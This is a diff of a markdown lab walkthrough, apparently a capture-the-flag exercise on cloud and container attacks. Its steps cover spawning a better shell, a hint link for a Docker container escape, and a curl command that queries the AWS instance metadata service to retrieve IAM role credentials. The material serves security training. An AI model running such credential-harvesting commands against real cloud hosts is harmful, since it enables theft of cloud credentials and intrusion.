@@ -71,7 +71,7 @@ Check what the app contains and search how you can exploit the vulnerability it 
   ```
 </details>
 
-#### Bonus Step 2 : 
+#### Bonus Step 1 : 
 
 Spawn an interactive shell. Check how you can spawn a better shell than your current dummy shell.
 
@@ -122,8 +122,9 @@ The goal of this step is to perform a container escape to obtain a shell on the 
 
 <details>
   <summary>Hint 4</summary>
+  Check out this :
   
-  
+  [blog](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation)
 </details>
 
 <details>
@@ -237,7 +238,7 @@ The goal of this step is to retrieve the aws credentials associated to the IAM r
 
   TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials
 
-  TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/app-eks-node-group-20230105092937095600000002
+  TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/<aks_node_group_name>
   ```
   Extract the result of the last command to a json file and use the [python script](solutions/step4/export-credentials-aws.py) to obtain the export command to implement the aws credentials on your machine.
 
